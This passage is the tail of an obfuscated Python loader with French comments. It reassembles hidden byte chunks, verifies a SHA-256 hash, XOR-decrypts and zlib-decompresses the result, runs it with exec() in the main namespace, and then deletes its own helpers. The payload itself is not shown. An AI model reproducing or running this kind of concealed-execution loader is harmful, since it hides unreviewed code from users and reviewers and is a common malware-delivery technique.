_cxpoFBnbHwdhIC + _cuLyD0ZzZcaLrL + _ciGrkaIOH4dWt3 + _cz_1UwCeHw6bV0 + _cjcnWvshlXAEhV + _csqaY_D_t8xJ2A + _csd2Gd8XKEgtxG + _csgnt0H7nkSbqK + _cc4LB2LASfAsQS + _ctXrPDNdH4S9cs + _ckbL2jqnK0kaJo + _cifKhTkOLlzK9x + _crkppcx49Ll9cN + _csmAxMwqn5_CpF + _cw1gbhaydmutGA + _cwA0MsNgsLMv4H + _ce5Jb5GuSHw8DK + _ckiQj0li_sDQKE + _cph7Q7OLj8o59t + _cahWlu7DegpmFG + _ckt9d0sLtBf0PP + _cm784obpX33zyN + _cwHRfHTyRcy7ea + _czdb3D3K9JGisJ + _cm4jP4Aec1WTi4 + _cuECcQaiSWyzmu + _cf_RXiZskkaQsD + _ccbnMhZL6_CZGw + _cag3VVSCSPfaPu + _cacP18QnuxrYPi + _cw9rjERQSr4op0 + _ckJhQS6F3N7Mhu + _cvVWCKviHPZO05 + _czgbBAK7tk7q5k + _cdUb8gD5zc4c1U + _cvxFn7rT55wbdO + _cdTUcCkRfoc0Qf + _clo0XOmPEQJSt8 + _caL4wtg_6kgfyp + _cp2PRYdr7ugK9P + _clc1wikW4xdPkA + _cwVuXIGVXOa3nh + _clsw76obJIoeAa + _cduMdU_iraju_Z + _ctnQa2Bv3Vm8TD + _cqlLXD7btcAmfr + _crz9GZeU02XrkM + _ckDVrAMhocytbw + _cqDrpY_ZMrP7s2 + _cnoWr1D2iAq4fl + _cux57nPDgP9yuX + _cc2WuJI2eyVn1p + _cmLBuS0HqDwBux + _cyLAsjTLaicv86 + _cbmvUOvkI5FtsO + _ccMYddvNdGn6cB + _cw7JkFvVHkkihy + _cpOCrX5dwsDeDq + _cr6o5RIBTrX043 + _cn3QzQkIdCn8aG + _cigX1xLcS3XxUH + _clBI1STOeCZSOk + _cbFsDBQOzexiJI + _cyo8Xm9Gm8MtDq + _crCCarzaKoHHrV + _cttd3otHkiAJ2A + _cyOkxNYwWcF9wF + _cd699UkCCAz7hF + _cc3gDMWQyHbhsS + _clHLLeU0nBoIXW + _coy4VGDbgMXDbT + _ci77VbeulrOrOs + _couMV_PayWg7Zv + _cctQyS1HBgQPUj + _cjaHKqH3rWQRLf + _ceNZdXzZvpR5SS + _ckdUiKH3V66nJ_ + _cyk_ZDkV2KnreL + _cckwHClMAqS251 + _cleOLyaeV0C_xh + _cdGZkUQ2jMDmUy + _czk1qMPEoETw8n + _chpSJFcyLeuhct + _coH3bLAXRRbqCX)
if __import__('hashlib').sha256(_puW3z82EVcJw5F).hexdigest() != '6e12f9882b9834dd971f375af4d45a63a1c5aaea130cc8c3605d95f7b4963912':
    __import__('sys').exit(1)
_xmbwzO9eG45CIn = bytes([211, 223, 93, 57, 140, 101, 76, 198, 6, 144, 81, 2, 148, 75, 25, 167, 183, 76, 152, 75, 20, 96, 235, 203, 233, 155, 192])
_fko1pmBJdu4tzyr = bytes([129, 152, 240, 70, 105, 54, 154, 183, 33, 60, 175, 130, 140, 135, 53, 228, 21, 99, 199, 215, 186, 148, 194, 89, 153, 150, 86])

def _fxk_55Q6OAhyyuE(_bfLis9hB5aT8Pf, _k_2cbgBWqh8Csf):
    return bytes(_bfLis9hB5aT8Pf[_imFKniGCZuNi3G] ^ _k_2cbgBWqh8Csf[_imFKniGCZuNi3G % len(_k_2cbgBWqh8Csf)] for _imFKniGCZuNi3G in range(len(_bfLis9hB5aT8Pf)))

def _fdbwlR7SZbTY3B2(_tgh_6mRqPjidhR):
    import zlib
    return zlib.decompress(_tgh_6mRqPjidhR) # Un seul niveau de zlib ici pour simplifier

def _feuLr0TWRhTYaBQ():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xd7xZ5kbLloP3x = _fxk_55Q6OAhyyuE(_puW3z82EVcJw5F, _xmbwzO9eG45CIn)
    # 2. Décompression Zlib
    _d_t6YjBPgmm3qX = _fdbwlR7SZbTY3B2(_xd7xZ5kbLloP3x)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _d_t6YjBPgmm3qX.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _n_QYG3lMUG3_7d = _main.__dict__
    _n_QYG3lMUG3_7d.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _n_QYG3lMUG3_7d)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feuLr0TWRhTYaBQ()
try:
    del _fxk_55Q6OAhyyuE, _fdbwlR7SZbTY3B2, _feuLr0TWRhTYaBQ
    del _puW3z82EVcJw5F, _xmbwzO9eG45CIn, _fko1pmBJdu4tzyr
except:
    pass
